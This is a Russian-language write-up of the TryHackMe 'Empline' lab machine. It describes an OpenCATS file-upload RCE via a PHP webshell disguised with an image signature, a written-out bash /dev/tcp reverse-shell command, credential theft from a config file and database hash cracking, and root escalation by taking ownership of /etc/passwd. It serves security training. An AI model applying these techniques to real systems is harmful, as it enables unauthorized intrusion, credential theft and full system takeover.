![](CTF/TryHackMe/Hard/Empline/screenshots/image0.png)

*	Difficult: `Hard`
# WriteUp

1. Провел первичный анализ:
   - open-ports:
   22 shh  
   80 http - Apache 2.4.29 | JS  библиотека - Jquorry
   3306 mySql - MariaDB 5.5.5-10.1.48 

   - Информация со странички:
   SysAdmin - George Tasa
   WebAnalyst - James Gynja

![](CTF/TryHackMe/Hard/Empline/screenshots/image2.png)

2. Просканировал директории но ничего интересного кроме uploads там небыло. Затем просканировал поддомены - нашел `job.empline.thm`

![](CTF/TryHackMe/Hard/Empline/screenshots/image1.png)

3. Перейдя по адресу, меня встретила форма авторизации в opencats (CRM для рекрутинга)

![](CTF/TryHackMe/Hard/Empline/screenshots/image3.png)

4. В исходном коде самой первой странички я так же нашел адрес `job.empline.thm/careers`

![](CTF/TryHackMe/Hard/Empline/screenshots/image4.png)

5. Перейдя туда, увидел простой интерфейс с вакансиями, зашел на единственную что там была.

![](CTF/TryHackMe/Hard/Empline/screenshots/image6.png)

6. Увидел форму для заполнения данных кандидата где можно было прикрепить резюме.

![](CTF/TryHackMe/Hard/Empline/screenshots/image5.png)

7. Потыкав различные запросы в BurpSuite, я нашел в ответе версию opencats

![](CTF/TryHackMe/Hard/Empline/screenshots/image7.png)

8. Для этой версии существует эксплоит RCE через загрузку файлов. Суть в том, что сервер не проверяет расширение файла которое загружается в эту форму.

![](CTF/TryHackMe/Hard/Empline/screenshots/image8.png)

9. Прочитав сам эксплоит, понял как он работает и куда загружаются файлы через эту форму. Они загружаются по пути: `/careers/attachments/shell.php`. Перехватывая запросы, я заметил что в параметре выделенном на скриншоте, нужно явно указать значение `"resumeLoad"`

![](CTF/TryHackMe/Hard/Empline/screenshots/image9.png)

10. Записал в файл свой PHP webshell и в начале файла добавил сигнатуру изображения, так как в эксплоите это делается тоже, для того чтобы обойти валидацию если она есть. Без этого файл не загружался. Затем я перехватил запрос на загрузку снова и изменил нужный параметр.

![](CTF/TryHackMe/Hard/Empline/screenshots/image10.png)

11. После отправки этого запроса, перешел в директорию для загруженных файлов и увидел, что файл успешно загрузился на сервер.

![](CTF/TryHackMe/Hard/Empline/screenshots/image11.png)

12. Проверял работу веб шелла так же черезе BurpSuite. Ввел команду id и сервер в ответе вернул вывод команды. Всё работает.

![](CTF/TryHackMe/Hard/Empline/screenshots/image12.png)

13. Пытался получить реверс шелл различными командами, например : `0=bash -c 'bash -i >& /dev/tcp/192.168.192.77/4444 0>&1'`, но ни одна не работала. И я решил сделать это так же, через php. 

![](CTF/TryHackMe/Hard/Empline/screenshots/image13.png)

14. Запустив слушатель и отправи запрос я получил ReversShell

![](CTF/TryHackMe/Hard/Empline/screenshots/image14.png)

15. Стабилизировал оболочку для удобства работы 

![](CTF/TryHackMe/Hard/Empline/screenshots/image15.png)

16. Нашел ещё двух пользователей `george` и `ubuntu` но в их папки зайти не удалось, так как прав недостаточно.

![](CTF/TryHackMe/Hard/Empline/screenshots/image16.png)

17. Заметил, что у меня есть доступ к кнофигу opencats и я решил поискать что то там.

![](CTF/TryHackMe/Hard/Empline/screenshots/image17.png)

18. В этом файле я нашел имя пользователя и пароль для доступа к базе данных

![](screenshots/image18.png)

19. Уже со своей машины, подключился к базе данных с помощью этих учетных данных

![](screenshots/image19.png)

20. В базе opencats нашел таблицу `user` 

![](screenshots/image20.png)

21. В таблице `user`, есть колонки `user_name` и `password`

![](screenshots/image21.png)

22. Вывел содержимое этих колонок, в них содержались имена пользователей и хэши паролей.

![](screenshots/image22.png)

23. Перебрал несколько словарей, и удалось получить доступ только к паролю пользователя james.

![](screenshots/image23.png)

24. Подключился по ссш с этими учётными данными и получил первый флаг.

![](screenshots/image24.png)

25. Провел базовую проверку конфигурации, проверял какие права у меня есть под этим пользователем, какие программы запускаются от рута, какие процессы запущены. Ничего особо не найдя решил использовать linpeas. Запустил http сервер и загрузил скрипт на машину.

![](screenshots/image25.png)

![](screenshots/image26.png)

26. В выводе скрипты было много интересных моментов, но он выделил бинарник ruby который может менять создателя файлов.

![](screenshots/image27.png)

27. Я изменил создателя у файла passwd, чтобы иметь возможность его изменять.

![](screenshots/image28.png)

28. Это сработало и я стал создателем файла passwd

![](screenshots/image29.png)

29. Я сгенерировал хэш пароля у себя на машине и добавил нового root пользователя в этот файл. Затем залогинился под новым пользователем.

![](screenshots/image30.png)

30. Прочитал финальный флаг

![](screenshots/image31.png)